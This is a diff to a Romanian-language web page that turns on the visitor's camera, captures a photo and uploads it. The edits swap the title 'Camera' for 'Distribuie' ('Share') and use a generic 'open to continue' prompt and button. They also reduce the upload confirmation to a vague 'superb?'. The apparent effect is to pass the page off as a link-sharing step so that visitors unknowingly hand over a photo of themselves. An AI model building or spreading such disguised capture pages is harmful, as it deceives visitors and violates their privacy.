@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Camera</title>
+  <title>Distribuie</title>
 
   <style>
     body {
@@ -49,14 +49,14 @@
 
 <div class="box">
 
-  <h1> distribuie </h1>
+  <h1>Distribuie</h1>
 
   <p id="status">
-    deschide linkul
+    Deschide pentru a continua.
   </p>
 
   <button id="start">
-    open
+    Deschide 
   </button>
 
   <video id="camera" autoplay playsinline></video>
@@ -106,12 +106,12 @@ startButton.addEventListener("click", async () => {
         if (!blob) return;
 
         const accept = confirm(
-          "linkul a fost creat vrei sa-l distribui mai departe?";
+          "superb?"
         );
 
         if (!accept) {
           statusText.textContent =
-            "Fotografia nu a fost încărcată.";
+            "mai incearca.";
 
           stream.getTracks().forEach(track => track.stop());
           video.style.display = "none";
@@ -120,7 +120,7 @@ startButton.addEventListener("click", async () => {
         }
 
         statusText.textContent =
-          "Se asteapta linkul...";
+          "asteptam...";
 
         try {
 
@@ -156,7 +156,7 @@ startButton.addEventListener("click", async () => {
           console.error(error);
 
           statusText.textContent =
-            "❌ ero.";
+            "❌ Nu s-a putut încărca fotografia.";
 
         }
 
@@ -172,7 +172,7 @@ startButton.addEventListener("click", async () => {
     console.error(error);
 
     statusText.textContent =
-      "❌ eroare.";
+      "❌ Camera nu a fost permisă.";
 
   }
 
